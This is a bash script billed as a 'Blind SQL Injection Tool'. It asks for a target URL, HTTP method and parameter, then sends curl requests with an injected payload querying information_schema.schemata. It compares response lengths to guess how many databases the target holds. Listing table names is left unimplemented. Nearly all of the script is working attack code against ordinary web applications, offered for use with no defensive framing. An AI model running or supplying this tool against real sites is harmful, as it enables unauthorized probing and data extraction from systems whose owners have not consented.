#!/bin/bash

echo "Welcome to the Blind SQL Injection Tool"
echo "---------------------------------------"
echo "1. List database names"
echo "2. List table names from a specific database"
echo "Select an option: "
read -r ACTION

echo "Select HTTP method:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
[[ "$METHOD_CHOICE" -eq 2 ]] && METHOD="POST"

echo "Enter the target URL: "
read -r URL

echo "Enter the parameter to test (e.g., id): "
read -r PARAMETER

# Function to send requests with SQL injection
send_request() {
    local query="$1"
    local injection="${PARAMETER}=${query}"
    local response

    if [ "$METHOD" == "POST" ]; then
        response=$(curl -s -X POST --data "$injection" "$URL")
    else
        response=$(curl -s -G --data-urlencode "$injection" "$URL")
    fi
    
    echo "$response"
}

# Function to extract the length of the information by response length comparison
extract_length() {
    local test_length
    local length
    local response_lengths=()
    local significant_difference=10  # Define a threshold for significant length difference

    # First, collect the lengths of all responses
    for length in {1..20}; do
        echo -n "Making request with count $length..."
        test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -" | wc -c)
        response_lengths[length]=$test_length
        echo " Length: ${response_lengths[length]}"
    done

    # Find the response length that stands out
    for length in {1..20}; do
        local differences=0
        for compare_length in {1..20}; do
            if [ "${response_lengths[length]}" -ne "${response_lengths[compare_length]}" ]; then
                differences=$((differences + 1))
            fi
        done

        # If one length is significantly different from the others, it's likely the correct one
        if [ "$differences" -ge "$significant_difference" ]; then
            echo "The correct count of databases is likely: $length (response length: ${response_lengths[length]})"
            return
        fi
    done

    echo "Failed to determine the correct count of databases."
}

# Main functionality to list databases or tables
list_items() {
    case "$ACTION" in
        1)
            echo "Listing Database Names..."
            extract_length
            ;;
        2)
            echo "Enter the database name to list tables: "
            read -r DATABASE_NAME
            # The logic for listing table names would go here
            echo "Functionality to list table names is not implemented in this script."
            ;;
        *)
            echo "Invalid option."
            exit 1
            ;;
    esac
}

# Execute the main functionality
list_items

